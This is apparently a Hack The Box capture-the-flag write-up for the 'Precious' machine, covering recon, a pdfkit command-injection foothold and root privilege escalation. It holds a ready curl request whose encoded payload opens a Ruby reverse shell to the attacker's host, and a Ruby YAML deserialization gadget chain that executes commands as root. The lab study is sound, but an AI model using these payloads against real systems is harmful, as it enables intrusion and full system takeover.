# HTB---Precious

Nmap report:

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 15:07 -0300
Nmap scan report for precious.htb (10.129.228.98)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   163.36 ms 10.10.14.1
2   163.61 ms precious.htb (10.129.228.98)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds

Running on port 80 is the following website:

<img width="1919" height="840" alt="image" src="https://github.com/user-attachments/assets/8198e772-bc86-4615-a5ba-ea4b2f632525" />

The only way i found to make it work was providin my own server:
<img width="771" height="162" alt="image" src="https://github.com/user-attachments/assets/a5d45e8b-bef5-42bc-9ca9-3b8bbf716f3f" />

Which generates the following file:
<img width="634" height="74" alt="image" src="https://github.com/user-attachments/assets/27acdef9-7c8b-4b1a-b940-906eee417fab" />

We run exiftool on it and recieve the following info:
<img width="685" height="303" alt="image" src="https://github.com/user-attachments/assets/9bd5d303-bb08-4869-bb12-d911420b8601" />

And discover pdfkit v0.8.6 is being used to generate the pdfs. Looking for CVE's on it we find a RCE one, alongside a PoC: https://github.com/shamo0/PDFkit-CMD-Injection

Just open a nc listener:
<img width="601" height="111" alt="image" src="https://github.com/user-attachments/assets/7fc37cc6-3e95-467d-b843-8f3a6371a48a" />

And mantain the python server open:
<img width="622" height="109" alt="image" src="https://github.com/user-attachments/assets/e9d180fe-405f-41a9-a7e3-08ee47384386" />

Finally modify this commando with your infos and then copy and paste it:
curl 'TARGET_ADDRESS' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: TARGET_ADDRESS' -H 'Connection: keep-alive' -H 'Referer: TARGET_ADDRESS' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'

You should recieve a webshell:
<img width="590" height="122" alt="image" src="https://github.com/user-attachments/assets/325f7427-a1a4-4387-9cac-8f35b372cbf3" />

We cannot cat the txt, in henry's folder:
<img width="393" height="204" alt="image" src="https://github.com/user-attachments/assets/b85a8719-162a-4c59-b2da-4aa404f9e922" />

And ruby folder is very suspiciously empty:
<img width="236" height="73" alt="image" src="https://github.com/user-attachments/assets/eafe23cc-7bca-4de8-9503-b1514b77a00f" />

If we try ls -la, we see a lot of hidden stuff:
<img width="597" height="139" alt="image" src="https://github.com/user-attachments/assets/685eb0d0-41bc-4911-bd15-6486c487b20c" />

After some enumeration we find some credentials:
<img width="709" height="157" alt="image" src="https://github.com/user-attachments/assets/66b57d3e-d212-4ad8-9efb-4598b861509a" />

SSH into henry and get user.txt:
<img width="669" height="304" alt="image" src="https://github.com/user-attachments/assets/93be3cce-0409-4db6-9bcd-44e3d423b42d" />

Now let's privesc. sudo -l:
<img width="957" height="122" alt="image" src="https://github.com/user-attachments/assets/fbcf84c6-06cf-4a0c-9aba-4ec7d21c4ee0" />

Let's study update_dependencies.rb:
<img width="898" height="542" alt="image" src="https://github.com/user-attachments/assets/06637740-1514-4e6b-a087-e91e089deee0" />

It reads and executes dependecies.yml. The good thing is that it does not specify absolute path for it, so let's craft our malicious dependencies.yml. This is a classic case of desserialization attack, google deserialization ruby attack and we find a very usefull repository: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md it has many usefull tools for deserialization including ruby. First let's check what version we are on:

<img width="846" height="65" alt="image" src="https://github.com/user-attachments/assets/9fbd129a-db9e-468f-8ea2-c95a6fce800b" />

create a dependencies file with this command:
"nano /tmp/dependencies.yml"
and copy paste this into it:

---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve

  Move to /tmp and execute the command:
  "sudo /usr/bin/ruby /opt/update_dependencies.rb"

  <img width="764" height="114" alt="image" src="https://github.com/user-attachments/assets/baffda40-2260-4cc9-8f5d-b4df1e863253" />

  Good stuff, we are executing commands as root. Nice. Now substitute "id" in "git_set: id" for  "/bin/bash" insiste the dependencie.yml and get root:
  <img width="1307" height="144" alt="image" src="https://github.com/user-attachments/assets/94b68a69-069a-4a23-881c-973e570e949d" />











